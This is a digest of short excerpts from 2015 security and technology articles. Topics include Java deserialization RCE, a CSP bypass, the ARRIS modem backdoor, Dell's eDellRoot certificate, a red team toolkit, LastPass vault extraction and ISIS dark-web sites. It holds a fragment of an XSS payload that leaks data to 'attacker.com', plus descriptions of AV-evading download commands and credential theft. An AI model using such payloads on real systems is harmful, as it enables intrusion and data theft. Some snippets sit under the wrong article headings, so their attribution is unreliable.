## Dotcom is building a private internet

- Kim Dotcom is building his own private internet, allegedly safe from the prying eyes of surveillance authorities.MegaNet will rely on peoples unused processing power on their phones and laptops, and allow them to donate bandwidth to the service.The more people that install the MegaNet app on their devices, the more powerful it will become, Dotcom said via video link at Sydneys SydStart conference last week.If 100 million smartphones joined up, the network would have more online storage capacity, bandwidth and calculating power than the top 10 largest websites in the world combined, he said.It will rely on existing physical internetinfrastructure people use today  so-called dumb pipes  but will add a new layer of encryption running through all communications.Dotcom claimed the encryption technology hell use is so powerfulno

- super computer will be able to crack it.The web mogul explained that MegaNet will work on a non-IP-based internet that uses the beauty of blockchain[Bitcoins public ledger]and new protocols to communicate and exchange data, while still using the internetsexisting physical infrastructure.If you dont have IP addresses you cant hack the server, you cant execute denial of service attacks on gaming services or websites, Dotcom saidfrom New Zealand,where he is currently awaiting the result of anextradition trial.Most importantly it will make it difficult for governments to invade our privacy.

- This entire network Im working on is fully encrypted.It literally works from the people for the people.In order to function, MegaNet is literally going to be using up your devicesbattery power, storage capacityand webbandwidth to power its so-called private network.  Ad Feedback 

- Its not costing them anything.As for theblockchain, MegaNetwill borrow from Bitcoins lauded method of recording transactions, butinstead of users storing transaction records, they willstore some of the files that make up this new alternative private internet.Presumably thesewill be encrypted too, otherwise everyone who connects to MegaNet will have some record of who is using the system and for what purpose, and that would contradictDotcoms pitch.The millionaire admitted that phone technology, includingbattery life, will need to improve before MegaNet can really take off.Were looking at a 10-year plan, he said.Over the next decade, current smartphones are going to be replaced by phones 10 times stronger and faster, with massively more computing power, that are as powerful as desktop computers are today.Battery tech in the making is going to give you 24 to 48 hours battery time with full usage.

- Todays bottlenecks might be a challenge, but over the years, with new devices and new capacity with mobile bandwidth, there will be no limitations.The mogul is confident that a technology solution will keep people secure and that privacy doesnt require newinfrastructure.Right now theyre just my words, but Ill prove it to you with proof when the service goes live.

## What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability.

- Depending on the language, this can lead to all sorts of consequences, but most interesting, and the one we will talk about here is remote code execution. Previous Work There have been a few Java unserialize vulnerabilities published in the past few years.

- The project started off promising, with such a large code base and so much exposed, there had to be something vulnerable. After some time searching we eventually got it into our heads that it would be amazing if we could find an unserialize vulnerability in Java or a common library.

- Remote code execution in many many things including custom applications Checkbox Checkers  Uncheck the boxes, youre probably not compliant anymore (and lets be honest, you probably never were)  How do you fix it?

- Then buckle up, this section in combination with the examples should give you enough to develop a working exploit. What Am I Looking For? The first thing you need to do is find a part of the application that takes a serialized object as input.

- I could lie to you and say this took me 15m to figure out, but it actually took a few hours. First Attempt Looking at the screenshot of the hex dump above, the first packet is pretty easy to replicate, we can just copy the bytes right out of Wireshark and paste them into a Python script, no problem.

## XSS vs CSP2

- In this blog post I would like to briefly discuss its effectiveness and gotchas with a real life example of a bypass I used in a Twitter's bug. Did you mean Cryptographically Safe Protocol (CSP)? No.

- Those are promising features but unfortunately not widely supported. X-Content-Security-Policy Quite often I saw reports recommending venders to add the X-Content-Security-Policy header in their apps in order to get CSP working on IE.

- Dangling Markup Injection, a technique coined by Michal Zalewski, prompts the receiving parser to consume a significant portion of the subsequent HTML syntax, so that part of the document structure is changed.

- In the following real life example, I am going to uncover even more loopholes in this regard.  Updated: Mathias Karlsson has discussed with me the vector meta http-equiv="set-cookie" to overwrite the CSRF cookie.

- Now everything is set, and the final payload: javascript:"link rel=prefetch href='//attacker.com/? ...Hooray!

## 9% of all HTTPS hosts and 6% of all SSH hosts on the web use hardcoded private keys embedded in firmware

- Here are some examples:  A certificate issued to a "Daniel", email (kiding@broadcom.com) is used in firmware from Actiontec, Aztech, Comtrend, Innatech, Linksys, Smart RG, Zhone and ZyXEL.

- More than 480.000 devices on the web are using this single certificate. A certificate issued to Multitech in Bangalore, India is used in firmware from Aztech, Bewan, Observa Telecom, NetComm Wireless, Zhone, ZTE and ZyXEL.

- A SSH host key can be attributed to this SDK as well. A certificate issued to "MatrixSSL Sample Server Cert" is used in WiMAX gateways from Green Packet, Huawei, Seowon Intech, ZTE and ZyXEL.

- Attack vectors can be BGP hijacking, an "evil ISP", or a global adversary with the capability to monitor Internet traffic. Searching for key fingerprints in data from Internet-wide scans is a low-cost way of finding the IP addresses of specific products/product groups.

- Affected vendors are: ADB, AMX, Actiontec, Adtran, Alcatel-Lucent, Alpha Networks, Aruba Networks, Aztech, Bewan, Busch-Jaeger, CTC Union, Cisco, Clear, Comtrend, D-Link, Deutsche Telekom, DrayTek, Edimax, General Electric (GE), Green Packet, Huawei, Infomark, Innatech, Linksys, Motorola, Moxa, NETGEAR, NetComm Wireless, ONT, Observa Telecom, Opengear, Pace, Philips, Pirelli , Robustel, Sagemcom, Seagate, Seowon Intech, Sierra Wireless, Smart RG, TP-LINK, TRENDnet, Technicolor, Tenda, Totolink, unify, UPVEL, Ubee Interactive, Ubiquiti Networks, Vodafone, Western Digital, ZTE, Zhone and ZyXEL. We have generated tree maps in order to interactively explore the HTTPS certificate and SSH host key exposure on the public web including distribution on a per-country and ISP basis.

## Dell instructs how to remove eDellRoot certificate, will be removed by software update today

- Customer security and privacy is a top concern and priority for Dell; we deeply regret that this has happened and are taking steps to address it. The certificate is not malware or adware.

- If you ever find a potential security vulnerability in any Dell product or software, we encourage you to visit this site to contact us immediately. *****UPDATE 11/25/2015***** Since Monday, our teams have been working hard to address the security issue caused by the eDellRoot certificate.

- If you previously uninstalled eDellRoot, we recommend you go through the process again to ensure a thorough sweep. WIRED has noted that security is far easier to promise than it is to achieve. We know that your trust is harder to win than it is to lose.

- This security step is in addition to actions already taken by Dell, as outlined in this post early last week, and by partners like Microsoft and Intel who added the patch to their anti-virus, anti-malware tools on November 25 to ensure both certificates were no longer usable.

- Unfortunately, I dont know whether simply uninstalling Dell Foundation Services actually removes the offending certificate. The fix-tool released today appears to solve the problem, but for those of us that have to manage hundreds or even thousands of systems, it is noisy popping up youre not affected or youve been fixed boxes which are intrusive to the user.

## Google Launches Android Studio 2.0 With Improved Android Emulator And New Instant Run Feature

- new feature called Instant Run. This almost mimics the experience of writing HTML, where you write your code, reload your browser and see what changed.

- With services like Xamarin Test Cloud, the AWS Device Farm, and Googles own Test Lab, developers have plenty of options to test their apps later on, but during the development process, most of the testing happens with the help of emulators.

- , Google is introducing new emulators that, given modern hardware, should run faster than any physical device.

## The First Official Daesh DARKNET Bulletin Board Has Arrived

- Screenshot from 2015-11-15 16:46:15 The Al-Hayat media group (daesh) has posted a link and explanation on how to get to their new darknet site today on the Shamikh forum (jihadi bulletin board in the clearnet) and linked it to Twitter as well to search for how tos and links.           #_              Dark web *  Tor     Tor : XXXXXXXXXX    : XXXXXXX                    Tor {   } I have redacted the site from the post but the right people are in the know now as to the location.

- The rub in this Telegram service is that it is run by ex-pat Russians. (correction: The Russian government has no control it seems over the owners and the physical location of the company is Germany.

- Also within the time since the original post here they have started to drop accts that daesh were using for propaganda) Oddly enough today POTUS met with Vladimir Putin for about thirty minutes to have a serious discussion about Syria and the Paris attacks.

- I would like to see Putin and the FSB do a little work on the Telegram company to get some intel but yeah, then it strays into that whole privacy thing that we are all upset about.

- Of course given the recent turn of events with the exploit against the darknet by UM and the FBI this all may be moot enough if they employ their new attack against this site.

## Daesh Darknet: Under The Hood

- Anyway, the fact of the matter is that this was put up by an acolyte of daesh who at least has enough wherewithal to get a host in the darknet and forward a clearnet feed to it.

- They make mistakes all the time and most of the time they are rookie stupid ones at that. That said, here is the data I pulled from the site: guid isPermaLink=falsehttps://185.92.223.109/?p=29759/guidgt;; inetnum: 185.92.220.0  185.92.223.255 netname: US-CHOOPA-20150320 descr: Choopa, LLC country: FR org: ORG-CL301-RIPE admin-c: CN3183-RIPE tech-c: CN3183-RIPE status: ALLOCATED PA mnt-by: RIPE-NCC-HM-MNT mnt-lower: MAINT-AS20473 mnt-routes: MAINT-AS20473 mnt-domains: MNT-CHOOPA created: 2015-03-20T07:30:59Z last-modified: 2015-03-30T17:31:46Z source: RIPE # Filtered organisation: ORG-CL301-RIPE org-name: Choopa, LLC org-type: LIR address: 100 Matawan Rd.

- Suite 420 Matawan, NJ 07747 phone: +1-973-849-0500 nic-hdl: CN3183-RIPE mnt-by: MAINT-AS20473 created: 2015-03-11T16:38:19Z last-modified: 2015-03-11T16:38:20Z source: RIPE # Filtered As you can see the site in the clearnet is hosted out of Choopa LLC which has its HQ in New Jersey.

- Once I backtrack I believe I will be able to come up with the who and more of the why this site came to be in the darknet. Screenshot from 2015-11-18 08:24:58 In the meantime though, I suspect that this post will cause a stir in the jimmies not only to the creator of the onion site but also all those keen watchers out there who wanna take things down like esdarat or isdarat or whatever shingle the daeshbags hang to serve their propaganda from.

- Since the rss box is in the clearnet and the content seems to be coming from Google, I expect to see a site in the darknet soon without any real content on it if you know what I mean... Have fun kids! Make it so. K. UPDATE: Seems the daeshbag onion has fallen down and gone boom already! Screenshot from 2015-11-18 09:49:24 Now both of the sites are down.

## ARRIS Cable Modem has a Backdoor in the Backdoor

- I started to study about some embedded device junk hacking hot topics and decided to talk about cable modem security.

- Spoiler Alert: everything's really really bad.  Securing cable modems is more difficult than other embedded devices because, on most cases, you cant choose your own device/firmware and software updates are almost entirely controlled by your ISP. While researching on the subject, I found a previously undisclosed backdoor on ARRIS cable modems, affecting many of their devices including TG862A, TG862G, DG860A.

- While people were still writing dumb fuzzers, he wrote AFL performed a detailed Technical analysis of Qualys' GHOST.

- Based on his analysis, I hired a couple of marketing specialists to find out the best way to disclose the ARRIS backdoor. What do we have here? - Multiple backdoors allowing full remote access to ARRIS Cable modems - An access key that is generated based on the Cable modem's serial number After a thoughtful analysis, the marketing committee advised w00tsec members to write a Keygen.

- Someone needs to update the Responsible Disclosure RFC and include a note describing that vendors shall lose disclosure points whenever they plant a backdoor on the device (ARRIS modems have a third backdoor too, check the ConsoleCowboys Blog). I'm pretty sure bad guys had been exploiting flaws on these devices for some time (just search for ARRIS DNS on Twitter, for example).

## Destroying The Encryption of Hidden Tear Ransomware

- I dont think so I decided to write a code which has huge security flaws so we can reverse the damage if anyone affected with it.

- Random Class uses Environment.TickCount (gets the number of milliseconds elapsed since the system started) as seed.

- Which is reduces the surface of brute forcing and beyond that its easy to predict.  Reuse of the IV Algorithm uses the same IV for every file in encryption process. Static Salt It uses static salt for encryption.

## Muse encrypted, transport-agnostic social protocol

- An individual persistence provider may operate over an arbitrary number of physical data transports, but must support a common command set to be Muse-compliant.

- Applications built on Muse can therefore addresses communications directly between the participants digital identities (essentially their public keys) without regard to the transport layer.

- Meanwhile, protocol implementations transparently pass this conversation across content-agnostic, network-oriented physical transports, storing files in pluggable persistence providers:

- Protocol-protected individual agency. This is a more meaningful benefit than platform-independent privacy; cloud-stored information is unavailable to anyone you dont explicitly share with, including the cloud owner. Application-independent content security. The protocol cant guarantee applications are running safe code, but it separates content authenticity, integrity, and confidentiality enforcement into open-source, vetted protocol implementations that are independent from the applications built on them. Hosting modularity. Container format is standardized, minimizing switching costs between hosting providers.

- This also makes it substantially easier to experiment with new transport technologies. Application agility. Instead of getting bogged down in incredibly difficult network implementation details, applications can focus on their core value propositions. Personal identity management. Identity, including usernames and passwords, are synchronized across the entire protocol.

## Fathomless - A red team toolkit (GPL).

- Provides a prototype CC web server along with an asynchronous powershell client, and a basic command interface.

- Enables execution of a command string on systems while evading countermeasures, specifically AV signature based detection.

- This is accomplished by focusing on obfuscating command strings that typically downloads a short script involved in first-stage/initial access.

- When a workstation is booted to this live environment its hard drive is mounted and the NTLM hash of the local admin (RID 500) is extracted.

- The admin hash is then leveraged in attacks against a Windows domain network using a patched winexe binary.

## Wrote a blog post outlining the strengthsweaknesses of the new SafeStack mitigation that will be featured in the next version of LLVM

- In June 2015, a new memory corruption exploit mitigation named SafeStack was merged into the llvm development branch

- SafeStack is a mitigation similar to (but potentially more powerful than) Stack Cookies

- tries to protect critical data on the stack by separating the native stack into two areas: A safe stack, which is used for control flow information as well as data that is only ever accessed in a safe way (as determined through static analysis). And an unsafe stack which is used for everything else that is stored on the stack.

- The two stacks are located in different memory regions in the process's address space and thus prevent a buffer overflow on the unsafe stack from corrupting anything on the safe stack.

## Faking the TCP handshake - New attack proves handshake does not authenticate based on IP address

- This is to keep track of whether all data has been received by the other party, to ensure reliable transmission. When this was designed in 1981, security was no priority.

- Host A is faking its IP address into C. One prerequisite for the attack is that the real C will not actually send "Huh what is going on"-packets (or RST packets), but that is easy: either take a non-existent C (e.g.

- After these 20 seconds you need to start over (send another SYN), but this does not make any difference since the chosen numbers are completely random. The cost of the attack?

- Our target responds to the fake IP address, and what happens next is that the tool starts guessing the right acknowledgement number.

- Even if the certificate is not authenticated, any encrypted TLS session will do because there is additional data that needs to be received by the client.

## When children are breached  inside the massive VTech hack

- The point is that it establishes a high degree of confidence as to where the data in the breach may have originally been entered. Now heres where I need to be intentionally vague because despite their assurances that their system is now secure, they still have gaping holes that allow every kid to be matched with every parent.

- The kids are almost precisely split between girls and boys and not only has their data already been leaked in this breach, it remains at serious risk due to the implementation of the site. Major security failings on VTechs behalf Let me caveat what Im about to detail by saying that everything Im about to share is publicly observable when the systems are used in their intended way.

- On seeing the haphazard way that internal database objects and queries are returned to the user, Ive no doubt in my mind that SQL injection flaws would be rampant. The other rampant practice thats increasingly frowned upon in the security space it the extensive use of Flash.

- It appears consistently throughout their online assets and whilst it would have made sense many years ago, the continuous stream of security vulnerabilities its presented coupled with the lack of mobile support and ready availability of alternative rich UIs via HTML 5 make it an increasingly rare thing to see such a dependency.

- The children arent, but I suspect this will be the first of many times their data will be breached, dumped and traded online. Update 1: It now appears as though head shots of kids and private chat messages were also exposed.

## Adobe is telling people to stop using Flash

- Flash pages and players can be slow to load and a big drain on laptop batteries.

- Adobe says it will be working with Microsoft and Google to maintain Flashs compatibility and security inside of web browsers.

- Adobe says that it expects to see Flash use continue, for now, in web gaming and premium video, because HTML5 or other standards have yet to fully mature to meet those areas needs.

## 600,000 cable routers found to have a backdoor within a backdoor

- Brazilian researcher discovers double security threat in Arris cable modems which allows an attacker to rewrite the firmware without the owner's knowledge.  I'm pretty sure bad guys had been exploiting flaws on these devices for some time (just search for ARRIS DNS on Twitter, for example), he warned. A broader view on firmware is not only beneficial, but necessary to discover new vulnerabilities and backdoors, correlating different device families and showing how vulnerabilities reappear across different products. Rodrigues said that the cable modem maker was slow to give feedback on the flaws he reported and it was only posting to CERT/CC that helped bring the issue to its attention. In a statement released to the media, Arris said that it was aware of the recently reported password vulnerability. The risk related to this vulnerability is low, and we are unaware of any exploit related to it.

- " A spokeswoman for Arris told SCMagazineUK.com that the issue doesn't affect modems in the UK. Gavin Reid, VP of threat intelligence at Lancope, told SC that backdoors in software are always a bad idea. They are especially bad when the software or device is connected directly to the internet, and even worse when the device itself is what you use to connect to the internet.

- " "An attacker could use this 'feature' to create themselves their own account on the router and then monitor all the traffic that flows through it including email and websites visited.

- The Arris router backdoor would allow the worst of all possible activities: monitoring or rerouting someone's internet communications.

## ISIS website is hacked and replaced with an advert for Viagra

- An ISIS propaganda website on the dark web has been hacked and replaced with an advert for a service selling prozac and viagra tablets which told extremists to 'calm down.

- ' The site for the terror group appeared on the Tor browser of the dark web last week in a bid to get extremists to join up. However, less than a week later, the site had been hacked and visitors to the page were greeted with a message for the medication. Scroll down for video Before it was hacked, people visiting the ISIS website on the dark web were greeted with messages in Arabic But after the Ghost Security Group infiltrated the site, it was replaced with an advert for medication at an online pharmacy It read: 'Too much ISIS.

- Please gaze upon this lovely ad so we can upgrade our infrastructure to give you ISIS content you all so desperately crave.

- ' According to the IBT, the website was taken down by Ghost Sec, a group of hackers loosely affiliated to fellow hacking group Anonymous. It is believed to be the first time that a hacking group have taken down a website on the dark web. The dark web is a subsection of the deep web - the part of the internet that does not show up in searches or on social media. Most of the information on the web is far down on dynamically generated sites, unable to be found or seen by traditional search engines. The dark web is used as a way of sharing information and trading goods, but the anonymous and encrypted nature of it has attracted large amounts of illegal activity. Hacking group Anonymous, known for their signature Guy Fawkes masks, pictured, has promised to hunt down militant jihadists online following the terrorist attacks in Paris last week which left 130 people dead Meanwhile, fellow hacking group Anonymous has promised to hunt down militant jihadists online following the terrorist attacks in Paris last week which left 130 people dead. Anonymous' declaration of war came in a video posted on the group's French YouTube page shortly after the Paris attacks, where they warned the terror group to 'expect us', vowing to hunt down those responsible online and expose them. Wearing the group's signature Guy Fawkes mask, a spokesman says in French: 'Anonymous from all over the world will hunt you down. 'You should know that we will find you and we will not let you go.

- Expect massive cyber attacks.

## ISIS parks its cash in Bitcoin, experts say | Fox News

- One account contained $3 million worth of bitcoin, a GhostSec member told Michael S. Smith II, a co-founder of Kronos Advisory, a national security advisory firm. Ghost Security Group wants to make an impact in counterterrorism, Smith said, adding that the GhostSec member reached out to him because government officials were not paying close attention to the allegations. Related: Has Anonymous's war against ISIS been doing more harm than good? Smith said U.S. counterterrorism officials are concerned that ISIS is acquiring gold and using numerous financial tools, including bitcoin, to tap into markets.

- Bitcoin accounts are set up with virtual money, but the digital funds can be cashed in for real money or goods. Related: #BrusselsLockdown request for social media blackout prompts flood of cat pictures A Ghost Security Group member said ISIS virtual currency amounts to between 1 percent and 3 percent of its total income  between $4.7 million and $15.6 million.

- The 9/11 Commission determined that it cost between $400,000 and $500,000 to plan and carry out the September 11 attacks on New York and Washington. Ghost Security Group hackers insist the alleged ISIS bitcoin account was not linked to the Paris attacks, but they say it shows that terror networks have found a way to transfer assets without easy detection. Related: Sony's PlayStation 4 could be terrorists' communication tool, experts warn The bitcoin universe is decentralized by design, according to Juniper Research, a firm that identifies online market trends.

- Theyre transferred seamlessly via nameless digital wallets. Cybersecurity expert Morgan Wright, a senior fellow at the Center for Digital Government, a national research and advisory institute on information technology policies, says terrorists are increasingly utilizing 21st century technology to transfer assets and finance operations Terrorists need anonymity, Wright said.

- Networks have looked for new ways to do it, and it appears theyve found it in bitcoin. Government officials have become increasingly concerned about these unregulated financial systems, and the U.S. is starting to apply money laundering regulations to cyber currencies.

- Ghost Security is a grass roots group of vigilantes whose war on ISIS garnersinternational headlines.

- The Isdarat franchise has been a powerful propaganda tool for ISIS but also a constant target of attacks, hence the move to perceived safety of the Dark Net.But that perception doesnt match reality.

- As recently as earlier this month, some of the Dark Nets most popular websitesblack markets selling illegal wares like drugs and stolen datareported massive denial-of-service attacks that put sophisticated storefronts out of operation for extended periods.Hidden websites operating in the Tor network, which are not accessible from a normal Web browser like Chrome or Firefox, offer a lot of extra protectionsbut theyre not bulletproof.Isdarats troubles mirror wider challenges to ISISs online presence.Messaging network Telegram is now actively censoring the Islamist militantswhile American social networks like Twitter, YouTube, and Facebook remain hostile terrain.Despite its losses online, ISIS remains a prolific presence across the Internet.As part of a coordinated post-Paris media campaign, ISIS supporters are producing multiple videos, infographics, and audio recordings daily that are then broadcast out to the world through networks like Twitter and Telegraph, even as both networks attempt to squash ISIS accounts as rapidly as they pop up.Photo via Christiaan Colen/Flickr(CC by 2.0) | Remix by Max Fleishman

## Superfish 2.0: Dangerous Certificate on Dell Laptops breaks encrypted HTTPS Connections - Hanno's blog

- I've provided an online check, affected users should delete the certificate. It seems that Dell hasn't learned anything from the Superfish-scandal earlier this year: Laptops from the company come with a preinstalled root certificate that will be accepted by browsers.

- Therefore attackers can use Man in the Middle attacks against Dell users to show them manipulated HTTPS webpages or read their encrypted data. The certificate, which is installed in the system's certificate store under the name "eDellRoot", gets installed by a software called Dell Foundation Services.

- This is a compromise in the implementation that allows the operation of so-called TLS interception proxies. I was made aware of this issue a while ago by Kristof Mattei.

- In that case Dell wouldn't have installed the private key on the system. Affected are only users that use browsers or other applications that use the system's certificate store.

- Similar vulnerabilities were found in other software products, for example in Privdog and in the ad blocker Adguard. This article is mostly a translation of a German article I wrote for Golem.de. Image source and license: Wistula / Wikimedia Commons, Creative Commons by 3.0 Update (2015-11-24): Second Dell root certificate DSDTestProvider I just found out that there is a second root certificate installed with some Dell software that causes exactly the same issue.

- In the wake of the Paris attacks, the vigilante hacker group Anonymous has declared war on so-called Islamic State using the internet and claims to have shut thousands of Twitter accounts used by IS operatives.

- But the director of Ghost Security Group said volunteers live in the US, Europe, and the Middle East, and include linguists and people familiar with intelligence gathering techniques.Instead of trying to shut down accounts and attack jihadi websites with distributed denial of service (DDoS) attacks - basically flooding a website with traffic to take it offline - Ghost Security Group members operate more like spies than hackers.

- They monitor suspected IS Twitter accounts and infiltrate militant message boards to find information, which they say they then pass along to law enforcement.We would much prefer to stop attacks than shut down websites, the executive director said.

- It stops them from recruiting young kids that have no place to go or people that are sick in the head, an Anonymous operative told BBC Radio 4s Profile.

- Were trying to identify any social media accounts that may have been involved in communicating about those attacks, he said, adding that when it comes to future plots we definitely hope to uncover them before they happen.Blog by Mike WendlingNext story: A brief history of online trolling by Western and Russian diplomats

## Using Markov chains as a keyed obfuscation method

- a project that has been sitting in my private git repository for a long while, and after I was recently reminded of it, Ive decided to write it up and do an initial release. The premise of the project is to use Markov chains in order to obfuscate binary information to appear similar to written language.

## Even the LastPass Will be Stolen Deal with It!

- so I though it was worth writing a post with all the details of our talk. Motivation During one of Albertos red team pentests, he gained access to several machines and found that all of them had files with references to LastPass.

- 10% of our time is for research so we made that our small project. We found how creds where stored locally and wrote a Metasploit plugin so he could use it to extract vault contents from all the compromised machines.

- Thanks to the module, he was able to obtain SSH keys to critical servers and the pentest was a success. I blogged about it in the past and it became very popular on reddit. We got a lot of feedback, questions, comments and suggestions.

- We had the same thought when we stumbled upon this functionality and we wanted to understand how it worked. The process In order to recover/decrypt your vault if you happened to forget the master password, youd need to visit the Recover Account site, provide your email and initiate the recovery.

- The best part is that now you know how to decrypt them and everything you need is right there. The problem here is that people are posting their prefs.js in forums looking for help on broken Firefox configurations, removing spyware, toolbars, etc.

## A Timeline of Terrorism

- The recent terrorist attacks in Paris have unfortunately once again brought terrorism to the front of many people's minds.

- Surprisingly though, terrorism had actually been decreasing from a peak in the late 80's and early 90's before this recent increase. What day of the year is most dangerous? Another interesting question to ask that is a bit hard to eyeball from the heatmap above by itself, is if there are particular days that are more likely to have terrorist attacks than others.

- Seeing as how we saw a drastic increase in the number and deadliness of attacks over the same timespan though it is clear that the groups that are active presently are increasingly more active and deadly than previous terrorist groups. Summary This initial analysis has confirmed that it is not just our perception that terrorism has been increasing over time4, and that there has been a real spike in terrorist activity in the last five years.

- Furthermore we've seen that:  Well known holidays such as Christmas seem to influence overall terrorist activity Terrorists are targeting ordinary citizens over military or government targets While the number of attacks have grown, the number of groups has not kept pace - meaning that the current crop of terrorist groups is more active than their historical counterparts  Further work could break down the types of attacks on each day (for example, is only a certain type of attack less likely on Christmas Day?)

- In particular the data shows South Asia has almost as many terrorist attacks as the Middle East and North Africa, a surprising result considering the focus of most news coverage in the US. Have more ideas or suggestions about how to use this data?

## Xposed framework now supports Android 6.0 Marshmallow - customize away!

- I find that its best for those who do not want a full-blown change of experience, but would prefer to tweak a few things here and there. All the user would need to install Xposed is a custom recovery and a rooted phone (of course).

- Especially dm-verity would definitely conflict with the modifications of the system partition. Access to preferences files might be blocked by SELinux, and Xposed is currently not able to work around that.

- (*) Some modules might be affected by this, nevertheless I strongly recommend to keep SELinux enabled and enforcing to keep your device as safe as possible. I could not test all Xposed APIs.

- The system is booting without any error messages from Xposed, but some functions that the framework makes available might still need to be adjusted for Marshmallow. Obviously, modules themselves might need to be updated as well due to changes in AOSP.

- If you absolutely cannot live without module X, dont update to Marshmallow yet. Some issues might arise from JIT (disabled by default, even in AOSP) and the optimizing compiler (which rewrites apps code to be more efficient, due to which some calls might simply be skipped).

## Next Big Future: Google planning a watershed quantum computing announcement for December 8

- According to Steve Jurvetson, venture capitalist and board member at pioneer quantum computing company D-WAVE, Google has what may be a watershed quantum computing announcement scheduled for early next month.

- This comes as D-WAVE, which notably also holds the Mountain View company as a customer, has just sold a 1000+ Qubit 2X quantum computer to national security research institution Los Alamos. Jurvetson says to stay tuned for more information coming on December 8th.

- This is the first weve heard of a December 8th date for a Google announcement, and considering its purported potential to be a turning point in computing, this could perhaps mean an actual event is in the cards. On Flickr, Steve Jurvetson mentioned that Los Alamos just purchased a D-Wave 2X with over 1000 qubits.

- And stay tuned for what may be a watershed announcement from Google on Dec 8.

## Beware of ads that use inaudible sound to link your phone, TV, tablet, and PC

- Flickr user: Lulu visionPrivacy advocates are warning federal authorities of a new threat that uses inaudible, high-frequency sounds to surreptitiously track a persons online behavior across a range of devices, including phones, TVs, tablets, and computers. The ultrasonic pitches are embedded into TV commercials or are played when a user encounters an ad displayed in a computer browser.

- Cross-device tracking allows marketers to combine these streams by linking them to the same individual, enhancing the granularity of what they know about that person. The officials said that companies with names including SilverPush, Drawbridge, and Flurry are working on ways to pair a given user to specific devices.

- The technology, which is typically not disclosed and cant be opted out of, makes it possible for marketers to assemble a shockingly detailed snapshot of the person being tracked. For example, a company could see that a user searched for sexually transmitted disease (STD) symptoms on her personal computer, looked up directions to a Planned Parenthood on her phone, visits a pharmacy, then returned to her apartment, the letter stated.

- While previously the various components of this journey would be scattered among several services, cross-device tracking allows companies to infer that the user received treatment for an STD.

- Federal officials should strongly consider changing that. Post updated on Nov 16, 2015 at 10:21am PST to add details about Adobe.

## EMV Protocol Fuzzer - mwrlabs

- Since EMV is based on the ISO 7816 standard, which secures inter-operation between smartcards and associated terminals, this research also applies to other implementations where smartcards are present such as in subscriber identity modules (SIMs) and DTV decoders. Although the standard defining EMV is in principal secure, vulnerabilities can easily be introduced into the terminal-smartcard authentication procedure by the hardware and software specific implementation of the actual EMV-enabled device.

- Recent work by [3] indicated the ease, at that time, with which vulnerabilities could be found in existing POS devices by using a programmable smartcard, without the need for sophisticated card-emulating or man-in-the-middle attack hardware.

- This case lends itself particularly well to an automated electronic solution, such as an EMV fuzzing device, which would be able to test a target terminal for potential vulnerabilities in a fast, controlled and reproducible manner.

- After the correct vulnerability disclosure procedure has been followed with affected parties, the remaining results will be published. The communication stream between a Point-of-sale (POS) terminal and a VISA smart card (ICC) is captured.

## LA's New Streetlamps Will Keep Cell Service Running After an Earthquake

- Cities beefing up their smart infrastructure have tapped the ubiquitous streetlamp to track traffic data and measure pollution.

- The location of the poleswhich are closer to the streets and sidewalks where people are actually using their phones than central cell towersgives the network the advantage of being more equally dispersed across the region.

- While better day-to-day cell service is a great feature, the real benefit here in LA is that the system wont be as likely to be knocked out by, I dunno, say, a major earthquake.

- This increased reliability for the wireless network is especially important in the event of emergencies  so that smartphones stay online when they are needed most, says Peter Marx, Chief Technology Office for the City of Los Angeles.

- The rest of the citys streetlamps are being upgraded to the CityTouch system, which allows their LED lights to be controlled and managed wirelessly.

## Let's Encrypt Entering Public Beta

- Invitations are no longer needed in order to get free certificates from Lets Encrypt. Its time for the Web to take a big step forward in terms of security and privacy.

- This allowed us to gain valuable insight into how our systems perform, and to be confident about moving to Public Beta. Wed also like to thank all of our sponsors for their support.

- Were happy to have announced earlier today that Facebook is our newest Gold sponsor. We have more work to do before were comfortable dropping the beta label entirely, particularly on the client experience.

- Automation is a cornerstone of our strategy, and we need to make sure that the client works smoothly and reliably on a wide range of platforms.

- Well be monitoring feedback from users closely, and making improvements as quickly as possible. Lets Encrypt Community Support is an invaluable resource for our community, we strongly recommend making use of the site if you have any questions about Lets Encrypt. Lets Encrypt depends on support from a wide variety of individuals and organizations.

## Critical Vulnerabilities in 3G4G Modems or how to build Big Brother

- The verification was incorrect: after uploading the firmware (an archive), the web server extracted two main files from it  the one specifying the size of the verified data and the one with the signed hash sum.

- Next, the verification script obtained a public key from the file system and sent a request to OpenSSL functions to decrypt signature and compare hashsum.

- We studied the second method only in theory  switching the network card mode from ad hoc to active, connecting to an access point, and changing modem routing. Not only HTTP traffic can be intercepted.

- Most of the devices can be infected right at the phone store during "checking before buying". There was another attack we failed to conduct  accessing the modem from the operator's network.

- The findings include Remote Code Execution (RCE) in web scripts, integrity attacks, Cross-Site Request Forgery (CSRF), and Cross-Site Scripting (XSS). The research covers a full range of attacks against carrier customers using these types of modems  device identification, code injection, PC infection, SIM card cloning, data interception, determining subscriber location, getting access to user accounts on the operator's website, and APT attacks.

## iOS Instrumentation without Jailbreak

- Starting with Frida 6.0, released last week, the assumption was that it would be technically possible to instrument iOS apps on non-jailbroken devices. I am absolutely thrilled to announce that, as of today, you can do just that: http://www.frida.re/docs/ios/#without-jailbreak All you have to do is embed Fridas .dylib into your app, and ensure that it gets loaded.

- You can then leverage Fridas existing CLI tools to trace native APIs, swizzle and play around with Objective-C, call any function, say for fuzzing, or anything else that you could already do on a jailbroken device once you got Frida loaded into a process. It is also possible to instrument iOS apps running in the iOS Simulator, which is really useful for security explorations during development. Enjoy!
